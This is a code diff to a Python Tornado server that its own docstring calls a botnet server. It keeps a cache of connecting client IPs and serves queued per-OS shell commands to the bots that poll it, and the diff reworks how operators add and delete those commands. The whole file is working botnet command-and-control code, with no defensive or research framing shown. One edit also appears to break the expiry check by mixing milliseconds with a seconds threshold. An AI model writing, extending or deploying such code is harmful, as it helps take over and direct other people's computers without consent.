@@ -1,8 +1,5 @@
 '''
     This is a botnet server implementation.
-
-    Missing:
-        a) CommandsService.get_commands implementation
 '''
 
 
@@ -15,6 +12,7 @@ import httpagentparser
 import json
 import time
 import os
+import uuid
 
 
 define('debug', default=True, help="debug mode", type=bool)
@@ -27,12 +25,12 @@ class ClientCache:
     def add_node(self, clientIp):
         if clientIp not in self.nodes:
             self.nodes[clientIp] = {
-                'last_seen': int(time.time()),
+                'last_seen': int(time.time() * 1000),
                 'windows': [],
                 'unix': [],
             }
         else:
-            self.nodes[clientIp]['last_seen'] = int(time.time())
+            self.nodes[clientIp]['last_seen'] = int(time.time() * 1000)
 
     def commands_to_execute(self, clientIp, commands, os='unix'):
         """
@@ -49,7 +47,7 @@ class ClientCache:
     def clean_up_expired(self):
         nodes_to_delete = []
         for key, values in self.nodes.items():
-            if int(time.time()) - values['last_seen'] > 3600:
+            if int(time.time() * 1000) - values['last_seen'] > 3600:
                 nodes_to_delete.append(key)
 
         for node in nodes_to_delete:
@@ -81,20 +79,22 @@ class CommandHandler(tornado.web.RequestHandler):
         self.write(json.dumps(self.application.commands, ensure_ascii=False))
 
     def post(self):
-        # add method
-        key = self.get_argument('key', '')
+        key = uuid.uuid4().hex
         sys_os = self.get_argument('os', 'unix')
-        command = self.get_argument('command', '')
+        command = self.get_argument('cmd', '')
+
         if sys_os in ['windows', 'unix']:
             self.application.commands[sys_os][key] = command
         else:
             self.set_status(400)
 
     def delete(self):
-        # delete method
+        
         key = self.get_argument('key', '')
-        if key in self.application.commands:
-            del self.application.commands[key]
+        sys_os = self.get_argument('os', '')
+
+        if sys_os in ['windows', 'unix']:
+            del self.application.commands[sys_os][key]
         else:
             self.set_status(404)
 
@@ -103,7 +103,6 @@ class CommandHandler(tornado.web.RequestHandler):
 class BotnetCommandsController(tornado.web.RequestHandler):
     def get(self):
         headers = self.request.headers
-        print(headers)
         clientIp = self.request.remote_ip
         self.application.clients_cache.add_node(clientIp)
 
@@ -145,8 +144,8 @@ class Application(tornado.web.Application):
             })
 
         settings = dict(
-            template_path=os.path.join(os.path.dirname(__file__), "files"),
-            static_path=os.path.join(os.path.dirname(__file__), "files"),
+            template_path=os.path.join(os.path.dirname(__file__), "public"),
+            static_path=os.path.join(os.path.dirname(__file__), "public"),
             debug=options.debug,
         )
 
